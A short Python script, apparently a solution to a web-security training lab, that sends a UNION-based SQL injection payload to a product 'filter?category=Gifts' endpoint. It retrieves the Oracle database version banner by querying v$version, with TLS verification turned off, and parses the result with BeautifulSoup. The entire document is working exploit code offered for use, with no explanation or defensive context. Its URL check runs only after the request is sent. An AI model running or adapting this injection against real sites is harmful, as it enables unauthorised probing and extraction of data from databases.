import requests 
import re 
import urllib3 
from bs4 import BeautifulSoup as bs 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s=requests.Session()
def sql_exploit(url,s):
    path="filter?category=Gifts"
    payload=f"'union select banner,null from v$version --"
    
    r=s.get(url+path+payload,verify=False)
    res=r.text
    
    if "Oracle Database " in res:
        print("Database version found ")
        soup=bs(res,'html.parser')
        D_version = soup.find(string=re.compile('.*Oracle Database.*'))
        print(f"Database version is : {D_version}")
        return True
    
    return False
        
if __name__ == "__main__":
    

    try:
        url=input("Please enter base url ")
        
        database_version = sql_exploit(url,s)
        
        if not database_version:
            print("Unable to dummp Database version ")
            
        
        if not url:
            raise ValueError("Please enter valid url ")
    except ValueError as e :
        print(e)
